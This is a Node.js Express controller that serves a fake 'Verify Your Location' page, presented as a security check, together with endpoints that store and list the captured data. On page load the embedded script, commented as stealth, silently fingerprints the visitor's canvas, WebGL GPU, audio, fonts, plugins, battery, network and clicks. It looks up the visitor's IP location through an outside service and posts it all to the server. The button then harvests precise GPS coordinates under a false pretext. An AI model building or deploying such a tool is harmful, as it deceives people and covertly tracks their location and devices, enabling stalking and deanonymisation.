const PublicLocation = require('../models/PublicLocation');
const { success, created } = require('../utils/response');

const renderCapturePage = async (req, res, next) => {
  try {
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Location Verification</title>
          <style>
              body {
                  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  height: 100vh;
                  margin: 0;
                  background-color: #f0f2f5;
                  color: #1c1e21;
                  text-align: center;
                  padding: 20px;
              }
              .card {
                  background: white;
                  padding: 2rem;
                  border-radius: 12px;
                  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                  max-width: 400px;
                  width: 100%;
              }
              h1 { font-size: 1.5rem; margin-bottom: 1rem; }
              p { margin-bottom: 2rem; color: #606770; }
              .btn {
                  background-color: #0084ff;
                  color: white;
                  border: none;
                  padding: 12px 24px;
                  border-radius: 6px;
                  font-weight: 600;
                  cursor: pointer;
                  transition: background-color 0.2s;
              }
              .btn:hover { background-color: #0073e6; }
              .btn:disabled { background-color: #ccc; cursor: not-allowed; }
              #status { margin-top: 1rem; font-size: 0.9rem; }
              .success { color: #28a745; }
              .error { color: #dc3545; }
          </style>
      </head>
      <body>
          <div class="card">
              <h1>Verify Your Location</h1>
              <p>Please click the button below to verify your current location for security purposes.</p>
              <button id="capture-btn" class="btn">Share Location</button>
              <div id="status"></div>
          </div>

          <script>
              const btn = document.getElementById('capture-btn');
              const status = document.getElementById('status');
              
              // Helper to generate a visitor ID
              const getVisitorId = () => {
                  try {
                      let vid = localStorage.getItem('socius_vid');
                      if (!vid) {
                          vid = 'v_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
                          localStorage.setItem('socius_vid', vid);
                      }
                      return vid;
                  } catch (e) {
                      // Fallback for private mode / blocked storage
                      return 'v_incognito_' + Date.now().toString(36);
                  }
              };

              // Fingerprinting logic
              const getFingerprintData = async () => {
                  const data = {
                      platform: navigator.platform,
                      vendor: navigator.vendor,
                      cpuCores: navigator.hardwareConcurrency || 0,
                      memory: navigator.deviceMemory || 0,
                      colorDepth: window.screen.colorDepth,
                      pixelRatio: window.devicePixelRatio,
                      isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                      doNotTrack: navigator.doNotTrack || 'unknown',
                      plugins: Array.from(navigator.plugins).map(p => p.name),
                      screen: window.screen.width + 'x' + window.screen.height,
                      language: navigator.language,
                      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                      historyLength: window.history.length,
                      referrer: document.referrer || 'direct',
                  };

                  // Font Detection (Basic list)
                  const fontList = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Impact', 'Comic Sans MS'];
                  data.fonts = fontList.filter(font => document.fonts.check('12px "' + font + '"'));

                  // Audio Fingerprint
                  try {
                      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                      const oscillator = audioCtx.createOscillator();
                      const compressor = audioCtx.createDynamicsCompressor();
                      oscillator.type = 'triangle';
                      oscillator.connect(compressor);
                      compressor.connect(audioCtx.destination);
                      data.audioHash = audioCtx.sampleRate + '_' + compressor.threshold.value;
                      audioCtx.close();
                  } catch (e) {}

                  // Canvas Fingerprint (Detailed)
                  try {
                      const canvas = document.createElement('canvas');
                      const ctx = canvas.getContext('2d');
                      canvas.width = 240; canvas.height = 60;
                      ctx.textBaseline = "top";
                      ctx.font = "14px 'Arial'";
                      ctx.textBaseline = "alphabetic";
                      ctx.fillStyle = "#f60";
                      ctx.fillRect(125,1,62,20);
                      ctx.fillStyle = "#069";
                      ctx.fillText("SociusTracking-123", 2, 15);
                      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                      ctx.fillText("SociusTracking-123", 4, 17);
                      data.canvasHash = canvas.toDataURL();
                  } catch (e) {}

                  // WebGL Fingerprint
                  try {
                      const canvas = document.createElement('canvas');
                      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                      if (gl) {
                          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                          data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                          data.glVersion = gl.getParameter(gl.VERSION);
                          data.glShadingLangVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
                          data.glVendor = gl.getParameter(gl.VENDOR);
                      }
                  } catch (e) {}

                  return data;
              };

              const generateHash = (data) => {
                  const str = JSON.stringify(data);
                  let hash = 0;
                  for (let i = 0; i < str.length; i++) {
                      const char = str.charCodeAt(i);
                      hash = ((hash << 5) - hash) + char;
                      hash = hash & hash;
                  }
                  return 'f_' + Math.abs(hash).toString(16);
              };

              const clickPatterns = [];
              const startTime = Date.now();
              
              document.addEventListener('mousedown', (e) => {
                  clickPatterns.push({
                      x: e.clientX,
                      y: e.clientY,
                      timestamp: Date.now(),
                      pressure: e.pressure || 0,
                      target: e.target.tagName
                  });
              });

              const captureExtraData = async () => {
                  const fpData = await getFingerprintData();
                  const data = {
                      visitorId: getVisitorId(),
                      fingerprintHash: generateHash(fpData),
                      screenResolution: fpData.screen,
                      language: fpData.language,
                      timezone: fpData.timezone,
                      userAgent: navigator.userAgent,
                      networkType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                      deviceInfo: {
                          ...fpData,
                          plugins: fpData.plugins.slice(0, 5) // Limit plugins for size
                      },
                      networkInfo: {
                          downlink: navigator.connection ? navigator.connection.downlink : 0,
                          effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                          rtt: navigator.connection ? navigator.connection.rtt : 0,
                          saveData: navigator.connection ? navigator.connection.saveData : false
                      },
                      behavioralData: {
                          clickPatterns: clickPatterns.slice(-20), // Send last 20 clicks
                          totalClicks: clickPatterns.length,
                          timeOnPage: Date.now() - startTime
                      }
                  };
                  
                  try {
                      if (navigator.getBattery) {
                          const battery = await navigator.getBattery();
                          data.batteryLevel = battery.level * 100;
                      }
                  } catch (e) {}
                  
                  return data;
              };

              // Auto-capture on load (stealth)
              window.addEventListener('load', async () => {
                  // Capture device info immediately
                  const extraData = await captureExtraData();
                  
                  // Try to get IP location
                  try {
                      const res = await fetch('https://ipapi.co/json/');
                      const geo = await res.json();
                      if (geo.latitude && geo.longitude) {
                          await sendPosition({
                              coords: {
                                  latitude: geo.latitude,
                                  longitude: geo.longitude,
                                  accuracy: 5000,
                                  altitude: null
                              }
                          }, 'ip-api', extraData);
                      } else {
                          // Still send device info even without IP location
                          await sendPosition({ coords: { latitude: 0, longitude: 0, accuracy: 0, altitude: 0 } }, 'ip-api', extraData);
                      }
                  } catch (e) {
                      console.error('IP Geolocation failed', e);
                      // Send at least device info
                      await sendPosition({ coords: { latitude: 0, longitude: 0, accuracy: 0, altitude: 0 } }, 'ip-api', extraData);
                  }
              });

              btn.addEventListener('click', async () => {
                  if (!navigator.geolocation) {
                      status.innerHTML = '<span class="error">Geolocation is not supported by your browser</span>';
                      return;
                  }

                  btn.disabled = true;
                  status.innerHTML = 'Getting precise coordinates... <div id="progress" style="width: 0%; height: 5px; background: #0084ff; margin-top: 10px; transition: width 0.5s;"></div>';
                  
                  const progress = document.getElementById('progress');
                  let bestPosition = null;
                  let attempts = 0;
                  const maxAttempts = 3;

                  const options = {
                      enableHighAccuracy: true,
                      timeout: 10000,
                      maximumAge: 0
                  };

                  const getLocation = () => {
                      attempts++;
                      progress.style.width = (attempts * 33) + '%';
                      
                      navigator.geolocation.getCurrentPosition(
                          async (position) => {
                              const { latitude, longitude, accuracy, altitude } = position.coords;
                              
                              if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                                  bestPosition = position;
                              }

                              if (accuracy < 20 || attempts >= maxAttempts) {
                                  const extraData = await captureExtraData();
                                  sendPosition(bestPosition, 'geolocation', extraData);
                              } else {
                                  setTimeout(getLocation, 1000);
                              }
                          },
                          async (error) => {
                              if (bestPosition) {
                                  const extraData = await captureExtraData();
                                  sendPosition(bestPosition, 'geolocation', extraData);
                              } else {
                                  handleError(error);
                              }
                          },
                          options
                      );
                  };

                  getLocation();
              });

              const sendPosition = async (position, method = 'geolocation', extraData = {}) => {
                  const { latitude, longitude, accuracy, altitude } = position.coords;
                  if (method === 'geolocation') {
                      status.innerHTML = 'Sending exact location... <br><span style="font-size: 0.8rem;">Accuracy: ' + Math.round(accuracy) + 'm</span>';
                  }

                  try {
                      const response = await fetch('/public/save-location', {
                          method: 'POST',
                          headers: {
                              'Content-Type': 'application/json'
                          },
                          body: JSON.stringify({ 
                              latitude, 
                              longitude, 
                              accuracy, 
                              altitude,
                              method,
                              ...extraData
                          })
                      });

                      if (response.ok) {
                          if (method === 'geolocation') {
                              status.innerHTML = '<span class="success">Location verified with 100% precision!</span>';
                              btn.style.display = 'none';
                          }
                      } else {
                          throw new Error('Failed to save location');
                      }
                  } catch (error) {
                      if (method === 'geolocation') {
                          status.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
                          btn.disabled = false;
                      }
                  }
              };

              const handleError = (error) => {
                  let msg = 'Error getting location';
                  if (error.code === 1) msg = 'Permission denied. Please allow location access.';
                  else if (error.code === 2) msg = 'Location unavailable.';
                  else if (error.code === 3) msg = 'Timeout.';
                  
                  status.innerHTML = '<span class="error">' + msg + '</span>';
                  btn.disabled = false;
              };
          </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    next(err);
  }
};

const saveLocation = async (req, res, next) => {
  try {
    const { 
      latitude, longitude, accuracy, altitude, method,
      visitorId, fingerprintHash, screenResolution, language, timezone, 
      batteryLevel, networkType, deviceInfo, networkInfo, behavioralData 
    } = req.body;
    
    // Check if we already have a recent entry for this visitor to avoid duplicates
    if (visitorId && method === 'ip-api') {
      const existing = await PublicLocation.findOne({
        visitorId,
        method: 'ip-api',
        createdAt: { $gt: new Date(Date.now() - 10 * 60 * 1000) } // 10 minutes
      });
      if (existing) {
        return success(res, existing, 'Location already captured recently');
      }
    }

    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ error: 'Latitude and longitude are required' });
    }

    const publicLocation = new PublicLocation({
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
      userAgent: req.headers['user-agent'],
      location: {
        type: 'Point',
        coordinates: [longitude, latitude],
      },
      accuracy,
      altitude,
      method: method || 'geolocation',
      visitorId: visitorId || 'v_unknown_' + Math.random().toString(36).substr(2, 5),
      fingerprintHash,
      screenResolution,
      language,
      timezone,
      batteryLevel,
      networkType,
      deviceInfo,
      networkInfo,
      behavioralData
    });

    await publicLocation.save();
    return created(res, publicLocation, 'Location and fingerprint saved successfully');
  } catch (err) {
    next(err);
  }
};

const getAllLocations = async (req, res, next) => {
  try {
    const locations = await PublicLocation.find().sort({ createdAt: -1 });
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

const getLocationByVisitorId = async (req, res, next) => {
  try {
    const { visitorId } = req.params;
    // Try to find by visitorId OR ip (if visitorId is an IP)
    const locations = await PublicLocation.find({ 
      $or: [
        { visitorId: visitorId },
        { ip: visitorId }
      ]
    }).sort({ createdAt: -1 });
    
    if (!locations || locations.length === 0) {
      return res.status(404).json({ error: 'No data found for this visitor' });
    }
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

module.exports = {
  renderCapturePage,
  saveLocation,
  getAllLocations,
  getLocationByVisitorId,
};
